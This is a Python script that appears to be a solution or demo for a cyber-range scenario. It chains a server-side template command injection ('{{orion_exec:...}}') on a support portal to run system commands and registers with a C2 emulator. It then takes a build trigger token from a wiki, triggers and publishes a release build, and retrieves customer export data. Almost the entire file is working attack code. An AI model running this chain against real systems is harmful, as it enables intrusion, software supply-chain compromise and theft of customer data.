import json

import httpx


def show(title, value):
    print("\n## " + title)
    print(json.dumps(value, indent=2) if not isinstance(value, str) else value)


def main():
    show("Support marker", httpx.post("http://support-portal:8000/preview", json={"body": "{{orion_exec:cat /var/lib/support-portal/.post_exploit_marker}}"}).json())
    show("Probe id", httpx.post("http://support-portal:8000/preview", json={"body": "{{orion_exec:id}}"}).json())
    show("Probe hostname", httpx.post("http://support-portal:8000/preview", json={"body": "{{orion_exec:hostname}}"}).json())
    show("Probe ls", httpx.post("http://support-portal:8000/preview", json={"body": "{{orion_exec:ls /opt/support-portal}}"}).json())
    show("Stage2", httpx.post("http://support-portal:8000/preview", json={"body": "{{orion_exec:cat /tmp/orion_stage2.txt}}"}).json())
    show("C2 register", httpx.post("http://c2-emulator:8000/beacon/register", json={"host": "support-portal"}).json())
    show("Service discovery", httpx.get("http://c2-emulator:8000/discover/services").json())
    show("Wiki token", httpx.get("http://wiki:8000/pages/release/runbook-build-trigger").json())
    show("Ticket", httpx.get("http://ticket-service:8000/tickets/OES-1287").json())
    show("Repo release", httpx.get("http://source-repo:8000/files/release-pipeline/release.json").json())
    show(
        "Build job",
        httpx.post(
            "http://build-server:8000/api/jobs",
            json={
                "repo": "orionecho/echo-agent",
                "ref": "refs/heads/release/2.6.4",
                "channel": "anrc",
                "trigger_token": "build-trigger-demo-7f3a91",
            },
        ).json(),
    )
    show("Sign publish", httpx.get("http://build-server:8000/demo/sign-and-publish").json())
    show("Customer poll", httpx.post("http://customer-app:8000/api/poll-now").json())
    show("Metadata", httpx.get("http://customer-api:8000/metadata").json())
    show("Facilities", httpx.get("http://customer-api:8000/facilities").json())
    show("Audits", httpx.get("http://customer-api:8000/audits").json())
    show("Exports", httpx.get("http://customer-api:8000/exports").json())
    detail = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007").json()
    show("Export detail", detail)
    show("Final object", httpx.get(detail["presigned_url"]).text)
    events = httpx.get("http://audit-log:8000/events").json()
    show("Audit count", events.get("count"))


if __name__ == "__main__":
    main()
